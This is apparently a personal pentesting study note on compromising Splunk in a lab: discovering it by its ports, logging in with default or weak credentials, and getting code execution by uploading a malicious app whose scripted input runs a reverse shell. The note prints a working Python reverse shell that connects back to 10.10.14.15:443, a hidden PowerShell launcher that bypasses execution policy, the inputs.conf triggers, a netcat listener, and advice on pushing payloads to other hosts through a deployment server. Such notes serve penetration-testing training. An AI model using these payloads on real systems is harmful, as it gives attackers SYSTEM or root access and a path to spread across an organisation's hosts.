# Splunk – Discovery and Attacking

## Overview

Splunk is a log analytics platform used to:

- collect data
- search and analyse logs
- visualise events
- support business analytics
- support security monitoring / SIEM-style use cases

Although it was not originally designed as a SIEM, it is very commonly used that way.

From an attacker perspective, Splunk is valuable because it often contains:

- sensitive logs
- credentials
- operational data
- infrastructure visibility
- security telemetry
- host and user information

Historically, Splunk has not had a huge number of major RCEs compared to some other enterprise apps. The notes mention:

- **CVE-2018-11409** – information disclosure
- **CVE-2011-4642** – authenticated RCE in very old versions

The bigger practical risk is usually:

- weak authentication
- no authentication
- built-in functionality abuse
- overprivileged service context

## Useful context

From the notes:

- Splunk was founded in **2003**
- became profitable in **2009**
- IPO in **2012** under **SPLK**
- over **7,500 employees**
- annual revenue near **$2.4 billion**
- listed in the **Fortune 1000** in 2020
- clients include **92 companies in the Fortune 100**
- Splunkbase had **2,000+ apps** as of 2021

## Why it matters

Splunk appears very often in:

- internal pentests
- large enterprise environments

It is less common externally, but when found, it can be a major opportunity.

If you compromise Splunk, you may get:

- sensitive internal data
- code execution
- high-privilege shell
- visibility into the wider environment
- possible access to downstream hosts via deployment infrastructure

Think of Splunk as both a log vault and a control point. If you get in, you often get both information and execution.

---

# 1. Discovery / Footprinting

Splunk’s web interface typically runs on:

- **8000** by default

Splunk also commonly exposes:

- **8089** – management / REST API port

## Default credentials

On older versions, the default credentials were often:

```text
admin:changeme
```

These were conveniently shown on the login page.

Newer versions require setting credentials during installation, but weak passwords are still common.

If defaults do not work, the notes suggest trying weak/common choices such as:

- `admin`
- `Welcome`
- `Welcome1`
- `Password123`

---

# 2. Nmap Discovery

A service/version scan can identify Splunk very quickly.

## Example from the notes

```bash
sudo nmap -sV 10.129.201.50
```

Example findings:

```text
8000/tcp open  ssl/http  Splunkd httpd
8089/tcp open  ssl/http  Splunkd httpd
```

The same host also showed other services, but the Splunk indicators were the important part.

## Why this matters

The combination of:

- `8000`
- `8089`
- `Splunkd httpd`

is a strong fingerprint.

The notes also inferred the host was Windows based on the rest of the service set.

---

# 3. Common Splunk Deployment Reality

The notes describe a very realistic scenario:

- someone installed **Splunk Enterprise Trial**
- it was forgotten
- after 60 days, it converted to **Splunk Free**
- the free version does **not require authentication**

This is a major security issue because administrators sometimes:

- forget the instance exists
- assume authentication still exists
- do not realise the free version has no user/role management

## Why this matters

A forgotten Splunk instance can become:

- unauthenticated log access
- unauthenticated admin capability
- an RCE path through built-in functionality

---

# 4. What You Can Do in Splunk Once Logged In

The notes highlight that once you are in Splunk, you can often:

- browse data
- run reports
- create dashboards
- install apps from Splunkbase
- install custom apps

That last item is the key one for attackers.

---

# 5. Main Built-In RCE Path – Scripted Inputs

Splunk can execute code through several mechanisms, including:

- server-side Django apps
- REST endpoints
- scripted inputs
- alert scripts

The most practical route from the notes is:

- **scripted inputs**

## What scripted inputs are for

They are designed to let Splunk ingest data from custom sources such as:

- APIs
- file servers
- custom scripts

The script runs, and its `STDOUT` is fed into Splunk as data.

## Why this matters to an attacker

If you can deploy a scripted input, you can make Splunk run:

- Python
- Bash
- PowerShell
- Batch

and turn that into code execution.

---

# 6. Why Splunk Is Especially Dangerous

The notes point out that Splunk often runs as:

- **root** on Linux
- **SYSTEM** on Windows

That means a successful scripted-input payload often lands you directly in a highly privileged context.

---

# 7. Splunk Custom App Structure

The notes used a custom malicious Splunk app to achieve RCE.

## Basic structure

```text
splunk_shell/
├── bin
└── default
```

### `bin/`
Contains scripts to execute.

### `default/`
Contains configuration such as `inputs.conf`.

This is the minimal structure needed for the attack path shown.

---

# 8. `inputs.conf`

This file tells Splunk which script to run and how often to run it.

Example from the notes:

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

## Key points

- `disabled = 0` → enabled
- `interval = 10` → runs every 10 seconds
- without an interval, the input will not execute the same way

## Why this matters

The moment the app is enabled, Splunk begins running the configured script on schedule.

That is the trigger for your reverse shell.

---

# 9. Windows Reverse Shell App

Because the target in the notes was Windows, the attack used:

- a PowerShell reverse shell
- a `.bat` launcher
- the Splunk app packaging mechanism

## PowerShell reverse shell example

The notes used a standard PowerShell TCP reverse shell one-liner embedded in a `.ps1` file.

The important idea is:

- `run.bat` launches `run.ps1`
- `inputs.conf` tells Splunk to run the batch file
- Splunk executes it as the Splunk service account
- the reverse shell connects back to you

## `run.bat`

Example from the notes:

```bat
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

## Why this works

- `%~dpn0.ps1` resolves to the matching `.ps1` path
- execution policy is bypassed
- PowerShell runs hidden
- Splunk only needs to execute the batch file

---

# 10. Packaging the Malicious App

Once the app structure is ready, it is packaged as a tarball or Splunk app archive.

## Example

```bash
tar -cvzf updater.tar.gz splunk_shell/
```

Example contents from the notes:

```text
splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

---

# 11. Uploading the App

Splunk allows app installation through the web interface.

## Relevant area

```text
/en-US/manager/search/apps/local
```

and the app upload path shown in the notes:

```text
/en-US/manager/appinstall/_upload
```

## Workflow

1. build malicious app
2. start your listener
3. upload the app
4. app is enabled
5. scripted input executes
6. reverse shell connects back

---

# 12. Reverse Shell Result

Before upload, start a listener.

## Example

```bash
sudo nc -lnvp 443
```

After upload, the notes show an immediate shell:

```text
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145
```

Example commands:

```powershell
whoami
hostname
```

Example output:

```text
nt authority\system
APP03
```

This is the ideal outcome:

- code execution
- as `NT AUTHORITY\SYSTEM`
- on a Windows host
- likely domain-joined

At that point, you have an excellent foothold for:

- host enumeration
- credential hunting
- lateral movement
- AD enumeration

---

# 13. Linux Variant

If the Splunk host is Linux, the notes recommend using the Python scripted-input route instead.

Because Splunk ships with Python, this is very portable.

## Example Python reverse shell

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

## Why this matters

On Linux you do not need PowerShell or Batch logic.

The same app-upload process works; you just swap in the Python payload.

---

# 14. Deployment Server Angle

The notes make an important point about Splunk architecture.

If the compromised Splunk server is a **deployment server**, you may be able to push code to other hosts.

## Key path

Applications intended for deployment should be placed under:

```text
$SPLUNK_HOME/etc/deployment-apps
```

## Why this matters

If forwarders are pulling apps/config from that deployment server, you may be able to execute code on:

- Universal Forwarder hosts
- other managed Splunk nodes
- multiple systems at once

## Important Windows note

Universal Forwarders typically do **not** ship with Python like a full Splunk server, so in Windows-heavy environments a **PowerShell-based** app is the better choice.

---

# 15. Public Vulnerabilities

The notes mention that Splunk has had relatively few major exploitable vulns compared to many enterprise apps.

Examples mentioned:

- **CVE-2018-11409** – information disclosure
- **CVE-2011-4642** – authenticated RCE in very old versions
- an SSRF affecting the REST API was also referenced

The notes also mention that Splunk had around **47 CVEs** at that time.

## Practical takeaway

During real assessments, vulnerability scanners may flag lots of Splunk issues, but many are:

- informational
- low impact
- non-exploitable in practice

That is why knowing how to abuse **built-in functionality** is more useful than relying on CVEs alone.

---

# 16. Practical Workflow

## Step 1 – identify Splunk

Look for:

- `8000/tcp`
- `8089/tcp`
- `Splunkd httpd`

Example:

```bash
sudo nmap -sV <TARGET>
```

## Step 2 – test auth posture

Check whether it is:

- free mode with no auth
- default creds
- weak creds
- normal authenticated instance

Try:

- `admin:changeme`
- weak/common passwords

## Step 3 – confirm access level

Once in, check whether app installation is possible.

## Step 4 – build malicious app

Create:

- `bin/`
- `default/inputs.conf`

Decide payload based on OS:

- Windows → PowerShell / batch
- Linux → Python

## Step 5 – start listener

```bash
nc -lnvp <PORT>
```

## Step 6 – upload app

Use the web UI to install from file.

## Step 7 – catch shell

If the app is enabled on upload, the scripted input should execute automatically.

## Step 8 – determine privilege and role in environment

Check:

- `whoami`
- hostname
- domain membership
- service configuration
- stored creds
- deployment server role

---

# 17. Useful Paths

## Splunk homepage / launcher

```text
https://10.129.201.50:8000/en-US/app/launcher/home
```

## Apps management

```text
https://10.129.201.50:8000/en-US/manager/search/apps/local
```

## Upload page

```text
https://10.129.201.50:8000/en-US/manager/appinstall/_upload
```

---

# 18. Useful Commands

## Nmap fingerprinting

```bash
sudo nmap -sV 10.129.201.50
```

## Listener

```bash
sudo nc -lnvp 443
```

## Package malicious app

```bash
tar -cvzf updater.tar.gz splunk_shell/
```

## Windows `inputs.conf`

```ini
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

## Linux `inputs.conf`

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

---

# 19. Key Takeaways

- Splunk is common in enterprise environments and often holds sensitive data
- the biggest practical risk is usually weak/null authentication plus built-in feature abuse
- Splunk often runs as `root` or `SYSTEM`, making compromise high impact
- ports `8000` and `8089` are the main discovery indicators
- free/trial-to-free deployments can result in no authentication
- custom app upload plus scripted inputs is a very strong and reliable RCE path
- if the compromised host is a deployment server, the blast radius can expand to other Splunk-managed hosts

---

# Tags

#splunk
#siem
#log-analysis
#scripted-inputs
#rce
#windows
#linux
#powershell
#python
#deployment-server
#attacking-common-apps
#pentesting
#ctf
#obsidian